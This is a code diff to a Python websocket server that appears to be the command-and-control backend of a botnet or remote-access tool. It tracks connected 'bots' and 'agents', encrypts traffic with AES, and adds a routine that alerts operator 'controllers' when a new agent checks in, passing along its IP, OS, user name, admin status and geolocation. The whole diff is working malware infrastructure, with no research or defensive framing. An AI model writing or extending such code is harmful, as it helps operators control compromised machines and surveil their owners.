@@ -9,6 +9,7 @@ import secrets
 import argparse
 import pickle
 from encryption import AESCrypto, server_crypto
+from datetime import datetime
 
 
 logging.basicConfig(
@@ -37,7 +38,7 @@ def load_or_generate_token():
     new_token = secrets.token_hex(16)
     config = {
         "auth_token": new_token,
-        "created_at": __import__('datetime').datetime.now().isoformat(),
+        "created_at": datetime.now().isoformat(),
         "note": "Keep this token! Use it in controller."
     }
     
@@ -192,6 +193,33 @@ async def broadcast_bots_list():
             pickle.dump(connected_bots, f)
     except Exception as e:
         logging.error(f"Failed to save bots to disk: {e}")
+
+async def send_agent_notification(agent_info):
+    if not connected_controllers:
+        logging.info("[!] No controllers connected, skipping notification")
+        return
+    logging.info(f"[*] Sending notification about new agent: {agent_info.get('name')} to {len(connected_controllers)} controller(s)")
+    notification = await encrypt_message({
+        "type": "agent_connected_notification",
+        "agent_id": agent_info.get("id"),
+        "agent_name": agent_info.get("name"),
+        "agent_ip": agent_info.get("ip"),
+        "agent_os": agent_info.get("os"),
+        "agent_user": agent_info.get("user"),
+        "is_admin": agent_info.get("is_admin", False),
+        "geo": agent_info.get("geo", {}),
+        "timestamp": datetime.now().isoformat()
+    })
+    
+    disconnected_ctrls = set()
+    for ctrl_ws in connected_controllers:
+        try:
+            await ctrl_ws.send(notification)
+        except:
+            disconnected_ctrls.add(ctrl_ws)
+    
+    for ctrl_ws in disconnected_ctrls:
+        connected_controllers.discard(ctrl_ws)
 
 async def handle_connection(websocket):
     client_type = None
@@ -349,14 +377,37 @@ async def handle_connection(websocket):
             agent_id = data.get("id")
             if not agent_id: raise ValueError("No Agent ID")
             
-            connected_agents[agent_id] = {
+            agent_info = {
                 "ws": websocket,
-                "name": data.get("name"), "ip": data.get("ip"), "os": data.get("os"),
-                "user": data.get("user"), "is_admin": data.get("is_admin"),
-                "status": "online", "geo": data.get("geo", {}),
+                "name": data.get("name"), 
+                "ip": data.get("ip"), 
+                "os": data.get("os"),
+                "user": data.get("user"), 
+                "is_admin": data.get("is_admin"),
+                "status": "online", 
+                "geo": data.get("geo", {}),
                 "disabled_modules": data.get("disabled_modules", [])
             }
+            
+            is_new_agent = agent_id not in connected_agents
+            
+            connected_agents[agent_id] = agent_info
             logging.info(f"[+] Agent connected: {data.get('name')} | AES: {bool(server_crypto.key)}")
+            
+
+            if is_new_agent:
+
+                await send_agent_notification({
+                    "id": agent_id,
+                    "name": data.get("name"),
+                    "ip": data.get("ip"),
+                    "os": data.get("os"),
+                    "user": data.get("user"),
+                    "is_admin": data.get("is_admin", False),
+                    "geo": data.get("geo", {})
+                })
+
+            
             await broadcast_agents()
 
             async for msg_str in websocket:
